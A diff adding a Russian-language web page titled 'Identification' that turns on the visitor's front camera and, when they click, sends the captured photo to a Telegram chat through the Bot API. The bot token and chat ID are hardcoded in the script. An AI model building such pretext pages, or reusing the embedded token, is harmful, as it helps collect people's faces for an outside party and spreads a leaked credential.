@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Идентификация</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background: black;
+      color: white;
+      font-family: sans-serif;
+      text-align: center;
+      padding: 20px;
+    }
+    video, canvas {
+      margin-top: 20px;
+      max-width: 100%;
+      border: 2px solid red;
+    }
+    button {
+      margin-top: 20px;
+      padding: 12px 24px;
+      font-size: 18px;
+      background: red;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    h1 {
+      text-shadow: 0 0 10px red;
+    }
+  </style>
+</head>
+<body>
+  <h1>🔴 Камера активна</h1>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <button id="captureBtn">Сделать фото</button>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const captureBtn = document.getElementById('captureBtn');
+
+    // Проверка поддержки камеры
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      alert("Ваш браузер не поддерживает доступ к камере");
+    }
+
+    // Запрос камеры
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(err => {
+        alert("Ошибка доступа к камере: " + err.message);
+      });
+
+    captureBtn.addEventListener('click', () => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      canvas.toBlob(sendToTelegram, 'image/jpeg');
+    });
+
+    function sendToTelegram(blob) {
+      const token = '8262115584:AAGrTWbBmfFhn7JLrQODSOubzC19JwJI4e0';
+      const chatId = '900382090';
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob, 'photo.jpg');
+
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      }).then(() => {
+        alert("Фото отправлено в Telegram");
+      }).catch(err => {
+        alert("Ошибка отправки: " + err.message);
+      });
+    }
+  </script>
+</body>
+</html>
